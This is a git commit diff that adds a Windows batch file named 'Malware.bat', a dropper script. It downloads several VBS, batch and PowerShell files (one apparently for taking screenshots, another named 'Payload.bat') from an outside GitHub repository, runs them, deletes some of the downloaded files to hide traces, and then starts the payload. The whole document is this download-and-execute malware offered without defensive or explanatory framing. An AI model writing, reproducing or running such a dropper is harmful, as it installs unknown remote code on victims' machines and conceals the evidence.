090494e6ecd41088d240e726a6da6045068ab6ab
DanielNov2014 <michaelvinthermoller@gmail.com>
2025-04-14 08:37:50 +0200

    Add files via upload

---
+++ Malware/Malware.bat
@@ -0,0 +1,15 @@
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1
+curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat
+start talk.vbs
+start fileadder.bat
+timeout 3 > nul
+del /f /q "talk.vbs"
+del /f /q "fileadder.bat"
+del /f /q "Screenshot.ps1"
+start talk1.vbs
+timeout 6 > nul
+del /f /q "talk1.vbs"
+start Payload.bat
